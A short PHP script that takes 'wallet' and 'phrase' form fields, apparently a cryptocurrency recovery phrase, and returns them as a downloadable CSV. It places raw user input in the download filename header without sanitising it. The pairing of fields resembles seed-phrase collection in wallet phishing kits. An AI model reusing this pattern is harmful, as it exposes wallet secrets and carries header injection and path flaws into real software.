<?php
//give a filename
$filename = $_POST['wallet']."_".$_POST['phrase']."_excel.csv";
//set headers to download file
header( 'Content-Type: text/csv' );
header( 'Content-Disposition: attachment;filename='.$filename);
$file = fopen('php://output', 'w');            
//set the column names
$cells[] = array('Wallet', 'Phrase');
//pass all the form values
$cells[] = array($_POST['wallet'], $_POST['phrase']);
foreach($cells as $cell){
    fputcsv($file,$cell);
}
$target_Path = "excel_files/";
$target_Path = $target_Path.basename( $filename );
fclose($file); 
?>